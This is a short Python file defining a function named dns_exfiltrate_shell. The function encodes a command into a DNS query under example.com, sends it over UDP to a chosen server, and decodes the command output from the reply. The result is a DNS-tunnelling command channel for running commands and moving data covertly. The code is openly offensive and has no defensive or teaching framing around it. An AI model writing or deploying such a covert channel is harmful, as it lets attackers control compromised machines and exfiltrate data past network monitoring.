import socket
import base64
from dnslib import DNSRecord, QTYPE


def dns_exfiltrate_shell(command: str, server_ip: str, server_port: int = 53):
    """
    Sends a command over DNS by encoding it into a query and sending it to the server.
    The server will respond with the result of the command.
    """
    # Step 1: Base64 encode the command to safely include it in the DNS query
    encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')

    # Step 2: Create the DNS query with the encoded command
    domain = f"{encoded_command}.example.com"  # Use the encoded command as part of the DNS query
    dns_query = DNSRecord.question(domain, QTYPE.ANY)

    # Step 3: Send the DNS query to the server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(dns_query.pack(), (server_ip, server_port))  # Send DNS query
    print(f"Sent DNS query: {domain}")

    # Step 4: Receive the DNS response (output of the command)
    data, addr = sock.recvfrom(1024)  # Buffer size
    dns_response = DNSRecord.parse(data)

    # Step 5: Extract the command output from the DNS response (if present)
    if dns_response.rr:
        result = base64.b64decode(str(dns_response.rr[0].rdata)).decode('utf-8')
        print(f"Received command output: {result}")
    else:
        print("No response received from DNS server.")
    sock.close()